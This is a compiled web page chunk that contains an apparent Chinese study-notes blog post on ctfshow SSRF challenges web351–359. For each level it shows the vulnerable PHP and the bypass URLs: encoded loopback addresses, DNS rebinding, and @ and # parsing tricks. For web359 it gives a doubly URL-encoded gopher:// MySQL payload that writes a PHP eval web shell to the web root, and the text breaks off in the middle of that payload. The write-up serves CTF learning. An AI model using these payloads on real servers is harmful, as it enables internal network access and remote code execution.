import{Bt as e,Gn as t,Gt as n,H as r,Qn as i,Rt as a,V as o,X as s,_n as c}from"./framework.DfD1zdSt.js";import{t as l}from"./theme.DMgGaAyl.js";import"./chunks/vue-i18n.BSMUyWAh.js";import{a as u,i as d}from"./chunks/vue-router.DZdD3Cav.js";var f={__name:`ctfshow-ssrf`,setup(f,{expose:p}){let m=t(JSON.parse(`{"title":"ctfshow ssrf","description":"","frontmatter":{"title":"ctfshow ssrf","date":"2024-09-03 15:32:45","tags":["ssrf","ctfshow"],"categories":["学习笔记"],"firstImage":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409041931402.png"},"headers":[],"relativePath":"pages/posts/ctfshow-ssrf.md"}`)),h=u(),g=d(),_=Object.assign(g.meta.frontmatter||{},m.value?.frontmatter||{});return h.currentRoute.value.data=m.value,e(`valaxy:frontmatter`,_),globalThis.$frontmatter=_,p({frontmatter:{title:`ctfshow ssrf`,date:`2024-09-03 15:32:45`,tags:[`ssrf`,`ctfshow`],categories:[`学习笔记`]}}),(e,t)=>{let u=l;return a(),r(u,{frontmatter:i(_)},{"main-content-md":c(()=>[...t[0]||=[o(`p`,null,[s(`摘要：`),o(`a`,{href:`http://t.csdnimg.cn/21MYs`,target:`_blank`,rel:`noreferrer`},`http://t.csdnimg.cn/21MYs`),s(` web351 存在一个flag.php页面，访问会返回不是本地用户的消息，那肯定是要让我们以本地用户去访问127.0.0.1/flag.php 得到flag web352 parseurl 解析 URL 并返回关联数组，包含在 URL 中出现的各种。`)],-1),o(`p`,null,`<!-- more -->`,-1),o(`p`,null,[o(`a`,{href:`http://t.csdnimg.cn/21MYs`,target:`_blank`,rel:`noreferrer`},`http://t.csdnimg.cn/21MYs`)],-1),o(`h3`,{id:`web351`,tabindex:`-1`},[s(`web351 `),o(`a`,{class:`header-anchor`,href:`#web351`,"aria-label":`Permalink to "web351"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
//初始化一个cURL会话
$ch=curl_init($url);
//设定返回信息中包含响应信息头
curl_setopt($ch, CURLOPT_HEADER, 0);
//启用时会将头文件的信息作为数据流输出。 
//参数为1表示输出信息头,为0表示不输出

//设定curl_exec()函数将响应结果返回，而不是直接输出
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//参数为1表示$result,为0表示echo $result

//执行一个cURL会话
$result=curl_exec($ch);
//关闭一个curl会话
curl_close($ch);
//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略
echo ($result);
?>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`存在一个flag.php页面，访问会返回不是本地用户的消息，那肯定是要让我们以本地用户去访问127.0.0.1/flag.php`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`url=http://127.0.0.1/flag.php

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`得到flag`,-1),o(`h3`,{id:`web352`,tabindex:`-1`},[s(`web352 `),o(`a`,{class:`header-anchor`,href:`#web352`,"aria-label":`Permalink to "web352"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> 
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`parse_url`,-1),o(`p`,null,[s(`解析 URL 并返回关联数组，包含在 URL 中出现的各种组成部分。数组的元素值`),o(`em`,null,`不会`),s(` URL 解码。`)],-1),o(`p`,null,`代码中先判断是否为HTTP或https协议，之后判断我们传入的url中是否含有localhost和127.0.0，如果没有则执行下面语句`,-1),o(`p`,null,`过滤掉了localhost和127.0.0`,-1),o(`p`,null,`可以用127.0.1 、127.1、 127。0.0.1 或者转成16进制 2进制 进行`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`url=http://0x7F.0.0.1/flag.php   16进制
url=http://0177.0.0.1/flag.php    8进制
url=http://0.0.0.0/flag.php
url=http://0/flag.php
url=http://127.127.127.127/flag.php

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`web353`,tabindex:`-1`},[s(`web353 `),o(`a`,{class:`header-anchor`,href:`#web353`,"aria-label":`Permalink to "web353"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\\.0\\.|\\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`过滤更加严格，但可以使用进制变换，和上一题类似`,-1),o(`p`,null,[o(`a`,{href:`https://tool.520101.com/wangluo/jinzhizhuanhuan/`,target:`_blank`,rel:`noreferrer`},`IP地址进制转换网站`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`十六进制
url=http://0x7F.0.0.1/flag.php
八进制
url=http://0177.0.0.1/flag.php
10 进制整数格式
url=http://2130706433/flag.php
16 进制整数格式，还是上面那个网站转换记得前缀0x
url=http://0x7F000001/flag.php
还有一种特殊的省略模式
127.0.0.1写成127.1
用CIDR绕过localhost
url=http://127.127.127.127/flag.php
url=http://0/flag.php
url=http://0.0.0.0/flag.php

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`得到flag`,-1),o(`h3`,{id:`web354`,tabindex:`-1`},[s(`web354 `),o(`a`,{class:`header-anchor`,href:`#web354`,"aria-label":`Permalink to "web354"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`该题过滤了0和1`,-1),o(`p`,null,[s(`去了解了两种绕过方法：`),o(`a`,{href:`https://blog.csdn.net/weixin_44023442/article/details/113150211?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&utm_relevant_index=2`,target:`_blank`,rel:`noreferrer`},`(151条消息) 【漏洞利用】SSRF漏洞挖掘利用、绕过技巧、防御修复详细解析_白丁Gorilla的博客-CSDN博客_java ssrf 修复`)],-1),o(`p`,null,`利用302跳转`,-1),o(`p`,null,[s(`如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。 `),o(`a`,{href:`http://xip.io`,target:`_blank`,rel:`noreferrer`},`http://xip.io`),s(` 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。`)],-1),o(`p`,null,`DNS Rebinding`,-1),o(`p`,null,`对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。`,-1),o(`p`,null,`但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。`,-1),o(`p`,null,`要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP

(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证

(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。

(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`1·修改自己域名的a记录，改成127.0.0.1

2·这个网站a记录指向127.0.0.1 可以直接利用

url=http://sudo.cc/flag.php

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409041931402.png`,alt:`image-20240904193106308`,loading:`lazy`,decoding:`async`})],-1),o(`h3`,{id:`web355`,tabindex:`-1`},[s(`web355 `),o(`a`,{class:`header-anchor`,href:`#web355`,"aria-label":`Permalink to "web355"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`这个题限制了host的长度，小于等于5，使用127.1省略绕过`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`url=http://127.1/flag.php

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409041933748.png`,alt:`image-20240904193308711`,loading:`lazy`,decoding:`async`})],-1),o(`h3`,{id:`web356`,tabindex:`-1`},[s(`web356 `),o(`a`,{class:`header-anchor`,href:`#web356`,"aria-label":`Permalink to "web356"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=3)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`此题限制了host的长度小于等于3`,-1),o(`p`,null,`0在 linux 系统中会解析成127.0.0.1在windows中解析成0.0.0.0`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`url=http://0/flag.php

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`得到flag`,-1),o(`h3`,{id:`web357`,tabindex:`-1`},[s(`web357 `),o(`a`,{class:`header-anchor`,href:`#web357`,"aria-label":`Permalink to "web357"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}

echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`gethostbyname`,-1),o(`p`,null,`主要作用：用域名或者主机名获取地址，操作系统提供的库函数。`,-1),o(`p`,null,`成功返回的非空指针指向如下的hostent结构：`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`struct hostent
{
      char *h_name;      //主机名
      char **h_aliases;  //主机别名(指向到虚拟主机的域名)
      int h_addrtype;    //主机IP地址类型
      int h_length;      //主机IP地址长度，对于IPv4是四字节
      char **h_addr_list; //主机IP地址列表
};

#define h_addr h_addr_list[0] 

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`filter_var()函数`,-1),o(`p`,null,`通过指定的过滤器过滤变量`,-1),o(`p`,null,`如果成功，啧返回已过滤的数据，如果失败，则返回false`,-1),o(`table`,null,[o(`thead`,null,[o(`tr`,null,[o(`th`,null,`参数`),o(`th`,null,`描述`)])]),o(`tbody`,null,[o(`tr`,null,[o(`td`,null,`variable`),o(`td`,null,`必需。规定要过滤的变量。`)]),o(`tr`,null,[o(`td`,null,`filter`),o(`td`,null,`可选。规定要使用的过滤器的 ID。`)]),o(`tr`,null,[o(`td`,null,`options`),o(`td`,null,`规定包含标志/选项的数组。检查每个过滤器可能的标志和选项。`)])])],-1),o(`h3`,{id:`php-filter-函数`,tabindex:`-1`},[s(`PHP Filter 函数 `),o(`a`,{class:`header-anchor`,href:`#php-filter-函数`,"aria-label":`Permalink to "PHP Filter 函数"`},`​`)],-1),o(`p`,null,`PHP：指示支持该函数的最早的 PHP 版本。`,-1),o(`table`,null,[o(`thead`,null,[o(`tr`,null,[o(`th`,null,`函数`),o(`th`,null,`描述`),o(`th`,null,`PHP`)])]),o(`tbody`,null,[o(`tr`,null,[o(`td`,null,[o(`a`,{href:`http://writeblog.csdn.net/func_filter_has_var.asp`,target:`_blank`,rel:`noreferrer`},`filter_has_var()`)]),o(`td`,null,`检查是否存在指定输入类型的变量。`),o(`td`,null,`5`)]),o(`tr`,null,[o(`td`,null,[o(`a`,{href:`http://writeblog.csdn.net/func_filter_id.asp`,target:`_blank`,rel:`noreferrer`},`filter_id()`)]),o(`td`,null,`返回指定过滤器的 ID 号。`),o(`td`,null,`5`)]),o(`tr`,null,[o(`td`,null,[o(`a`,{href:`http://writeblog.csdn.net/func_filter_input.asp`,target:`_blank`,rel:`noreferrer`},`filter_input()`)]),o(`td`,null,`从脚本外部获取输入，并进行过滤。`),o(`td`,null,`5`)])])],-1),o(`table`,null,[o(`thead`,null,[o(`tr`,null,[o(`th`,null,[o(`a`,{href:`http://writeblog.csdn.net/func_filter_input_array.asp`,target:`_blank`,rel:`noreferrer`},`filter_input_array()`)]),o(`th`,null,`从脚本外部获取多项输入，并进行过滤。`),o(`th`,null,`5`)])]),o(`tbody`,null,[o(`tr`,null,[o(`td`,null,[o(`a`,{href:`http://writeblog.csdn.net/func_filter_list.asp`,target:`_blank`,rel:`noreferrer`},`filter_list()`)]),o(`td`,null,`返回包含所有得到支持的过滤器的一个数组。`),o(`td`,null,`5`)]),o(`tr`,null,[o(`td`,null,[o(`a`,{href:`http://writeblog.csdn.net/func_filter_var_array.asp`,target:`_blank`,rel:`noreferrer`},`filter_var_array()`)]),o(`td`,null,`获取多项变量，并进行过滤。`),o(`td`,null,`5`)]),o(`tr`,null,[o(`td`,null,[o(`a`,{href:`http://writeblog.csdn.net/func_filter_var.asp`,target:`_blank`,rel:`noreferrer`},`filter_var()`)]),o(`td`,null,`获取一个变量，并进行过滤。`),o(`td`,null,`5`)])])],-1),o(`h3`,{id:`php-filters`,tabindex:`-1`},[s(`PHP Filters `),o(`a`,{class:`header-anchor`,href:`#php-filters`,"aria-label":`Permalink to "PHP Filters"`},`​`)],-1),o(`table`,null,[o(`thead`,null,[o(`tr`,null,[o(`th`,{style:{"text-align":`left`}},`ID 名称`),o(`th`,{style:{"text-align":`left`}},`描述`)])]),o(`tbody`,null,[o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_callback.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_CALLBACK`)]),o(`td`,{style:{"text-align":`left`}},`调用用户自定义函数来过滤数据。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_sanitize_string.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_SANITIZE_STRING`)]),o(`td`,{style:{"text-align":`left`}},`去除标签，去除或编码特殊字符。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_sanitize_stripped.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_SANITIZE_STRIPPED`)]),o(`td`,{style:{"text-align":`left`}},`“string” 过滤器的别名。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_sanitize_encoded.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_SANITIZE_ENCODED`)]),o(`td`,{style:{"text-align":`left`}},`URL-encode 字符串，去除或编码特殊字符。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_sanitize_special_chars.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_SANITIZE_SPECIAL_CHARS`)]),o(`td`,{style:{"text-align":`left`}},`HTML 转义字符 '"<>& 以及 ASCII 值小于 32 的字符。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_sanitize_email.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_SANITIZE_EMAIL`)]),o(`td`,{style:{"text-align":`left`}},"删除所有字符，除了字母、数字以及 !#$%&'*±/=?^_`{|}~@.[]")]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_sanitize_url.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_SANITIZE_URL`)]),o(`td`,{style:{"text-align":`left`}},`删除所有字符，除了字母、数字以及 $-_.+!*'(),{}|\\^~[]\`<>#%";/?😡&=`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_sanitize_number_int.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_SANITIZE_NUMBER_INT`)]),o(`td`,{style:{"text-align":`left`}},`删除所有字符，除了数字和 ±`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_sanitize_number_float.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_SANITIZE_NUMBER_FLOAT`)]),o(`td`,{style:{"text-align":`left`}},`删除所有字符，除了数字、± 以及 .,eE。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_sanitize_magic_quotes.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_SANITIZE_MAGIC_QUOTES`)]),o(`td`,{style:{"text-align":`left`}},`应用 addslashes()。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_unsafe_raw.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_UNSAFE_RAW`)]),o(`td`,{style:{"text-align":`left`}},`不进行任何过滤，去除或编码特殊字符。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_validate_int.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_VALIDATE_INT`)]),o(`td`,{style:{"text-align":`left`}},`在指定的范围以整数验证值。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_validate_boolean.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_VALIDATE_BOOLEAN`)]),o(`td`,{style:{"text-align":`left`}},`如果是 “1”, “true”, “on” 以及 “yes”，则返回 true，如果是 “0”, “false”, “off”, “no” 以及 “”，则返回 false。否则返回 NULL。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_validate_float.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_VALIDATE_FLOAT`)]),o(`td`,{style:{"text-align":`left`}},`以浮点数验证值。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_validate_regexp.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_VALIDATE_REGEXP`)]),o(`td`,{style:{"text-align":`left`}},`根据 regexp，兼容 Perl 的正则表达式来验证值。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_validate_url.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_VALIDATE_URL`)]),o(`td`,{style:{"text-align":`left`}},`把值作为 URL 来验证。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_validate_email.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_VALIDATE_EMAIL`)]),o(`td`,{style:{"text-align":`left`}},`把值作为 e-mail 来验证。`)]),o(`tr`,null,[o(`td`,{style:{"text-align":`left`}},[o(`a`,{href:`https://www.w3school.com.cn/php/filter_validate_ip.asp`,target:`_blank`,rel:`noreferrer`},`FILTER_VALIDATE_IP`)]),o(`td`,{style:{"text-align":`left`}},`把值作为 IP 地址来验证。`)])])],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`gethostbyname — 返回主机名对应的 IPv4地址。 
filter_var — 使用特定的过滤器过滤一个变量
FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）
FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`所以url不能是私有地址，需要一个公网ip`,-1),o(`p`,null,`利用302跳转和dns重绑定都可以。`,-1),o(`p`,null,[s(`dns重绑定就用这个：`),o(`a`,{href:`https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg`,target:`_blank`,rel:`noreferrer`},`dns重绑定`)],-1),o(`p`,null,`不能有内网ip，所以填一个公网ip:`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042005669.png`,alt:`image-20240904200529637`,loading:`lazy`,decoding:`async`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042005422.png`,alt:`image-20240904200513380`,loading:`lazy`,decoding:`async`})],-1),o(`h3`,{id:`web358`,tabindex:`-1`},[s(`web358 `),o(`a`,{class:`header-anchor`,href:`#web358`,"aria-label":`Permalink to "web358"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){
    echo file_get_contents($url);
}
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[s(`这里的正则表示以`),o(`code`,null,`http://ctf.`),s(`开头，以`),o(`code`,null,`show`),s(`结尾，即匹配`),o(`code`,null,`http://ctf.*show`)],-1),o(`p`,null,`最终payload(127.0.0.1也可以换成其他形式):`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`url=http://ctf.@127.0.0.1/flag.php?show
url=http://ctf.@127.0.0.1/flag.php#show

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[s(`原理： 如果不在`),o(`code`,null,`ctf.`),s(`后面加`),o(`code`,null,`@`),s(`,解析url时会把`),o(`code`,null,`ctf.`),s(`也解析成`),o(`strong`,null,`host`),s(`的内容，如果不在`),o(`code`,null,`show`),s(`前面加`),o(`code`,null,`#`),s(`或`),o(`code`,null,`?`),s(`，会把`),o(`strong`,null,`show`),s(`也解析到`),o(`strong`,null,`path`),s(`中，得不到想要的结果`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042011821.png`,alt:`image-20240904201143679`,loading:`lazy`,decoding:`async`})],-1),o(`h3`,{id:`web359`,tabindex:`-1`},[s(`web359 `),o(`a`,{class:`header-anchor`,href:`#web359`,"aria-label":`Permalink to "web359"`},`​`)],-1),o(`p`,null,`我们抓包，发现有个u和returl参数，returl就是关键点`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042044204.png`,alt:`image-20240904204410132`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`下载工具`,-1),o(`figure`,null,[o(`img`,{src:`https://i-blog.csdnimg.cn/blog_migrate/96232bb99b29ea20befa2a98107d0db3.png`,alt:`image-20220417233251330`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`我们拿到`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%44%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%3b%20%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%01%00%00%00%01

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[s(`但是不能直接使用，因为`),o(`code`,null,`gopher://127.0.0.1:3306/_`),s(`后面的内容需要再`),o(`code`,null,`urlencode`),s(`一次，最后得到`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%